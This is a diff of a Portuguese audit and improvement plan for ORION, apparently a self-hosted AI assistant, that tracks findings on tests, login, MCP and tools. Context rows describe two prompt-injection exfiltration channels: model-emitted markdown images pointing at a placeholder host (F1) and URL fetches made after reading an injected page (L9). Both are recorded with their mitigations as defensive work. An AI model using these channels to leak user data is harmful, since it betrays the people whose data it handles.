@@ -1,7 +1,7 @@
 # ORION — Plano de melhorias e o que foi feito
 
 > Auditoria de 02/10/2026 (backend, front, regras, docs) e a execução dela, mais a segunda
-> rodada de 03/10/2026 (achados R1–R11) e a terceira de 06/10/2026 (L1–L10: login, MCP, ferramentas). Cada achado tem ID, evidência e status. O que
+> rodada de 03/10/2026 (achados R1–R11) e a terceira de 06/10/2026 (L1–L11: login, MCP, ferramentas). Cada achado tem ID, evidência e status. O que
 > **não** foi verificado está na seção própria.
 > Regras resultantes: [ORION_REGRAS.md](ORION_REGRAS.md). Plano de fases: [ORION_NUCLEO.md](ORION_NUCLEO.md).
 
@@ -24,7 +24,7 @@ Legenda: ✅ resolvido e testado · 🟡 parcial · ⏳ depende de você ou de f
 | E1 | Média | Sem CI nem testes unitários | ✅ | `.github/workflows/ci.yml` (Linux, Windows, macOS) + 270 testes Python + 18 em Node |
 | E2 | Média | Só Windows, caminhos `C:\Orion` fixos, `requirements` com pywin32/torch | 🟡 | Pacote novo é portável (`platformdirs`, caminhos por config). Legado segue Windows por desenho até a fase 7 |
 | E3 | Média | Globals, `ChatRouter` com 22 argumentos, `on_event` deprecado | ✅ (novo) | `create_app` com lifespan e `AppState` injetado |
-| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 86 testes de navegador (fluxos, segurança, entrada, janela estreita, axe). Ver [ORION_FRONT.md](ORION_FRONT.md) |
+| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 89 testes de navegador (86 com backend de mentira: fluxos, segurança, entrada, janela estreita, axe; 3 contra o Orion de verdade). Ver [ORION_FRONT.md](ORION_FRONT.md) |
 | E5 | Baixa | Drift de docs, `.gitignore`, `requirements` | 🟡 | Corrigidos. A pasta `Orion_Ollama/` **não** foi renomeada (o `.bat`, o boot e o README apontam para ela; sai na fase 7) |
 | E6 | Média | RAG sem avaliação (HR 10%, MRR 0.057) | ✅ | `orion.memory.eval` + conjunto fixo em pytest; CLI para as **suas** perguntas reais |
 | F1 | Média | *(achado durante a execução)* o chat renderizava `![x](https://host-qualquer/?d=…)` do modelo: exfiltração por prompt injection | ✅ | Só imagem de `/imagens/<arquivo>`; 18 testes em Node, com checagem de que falham no código antigo |
@@ -63,6 +63,7 @@ Tudo testado no Linux (CI nos três sistemas no PR). Cada item novo abaixo tem r
 | L8 | Baixa | `abrir_app` era "escrita com log", mas abre qualquer programa ou arquivo | ✅ | Passou a execução: sempre confirma |
 | L9 | Média | Um `buscar_url` depois de ler uma página injetada pode exfiltrar dados na própria URL (GET), e o taint só cobre escrita e execução | 🟡 | As ferramentas de web ficam **desligadas por padrão** (`ORION_WEB_TOOLS`); o endereço passa pelo `netguard` e fica no audit. O canal continua existindo: está documentado em `orion/tools/web.py` |
 | L10 | Baixa | Telegram só entendia texto | ✅ (API falsa) | Voz (Whisper no Groq, o texto entendido aparece antes da resposta) e foto (imagem só naquele turno) |
+| L11 | Alta | *(achado rodando o Orion de verdade com o front real)* aprovar uma ação no navegador falhava com HTTP 422: o front retoma sem corpo e `POST /approvals/{id}/resume` exigia um | ✅ | Corpo opcional (canal `web` por padrão) + teste. Os testes com backend de mentira não pegavam; agora há 3 testes contra o app, a política e o SQLite reais (`tests/front_e2e/test_orion_real.py`): login por cookie, conversa, aprovação que **executa de verdade** depois do clique, audit no banco, servidor MCP real e desligamento limpo. `mcp.json` e `auth.db` viraram arquivos sensíveis (ler e escrever confirmam) |
 
 ## O que foi construído (por fase do NUCLEO)
 
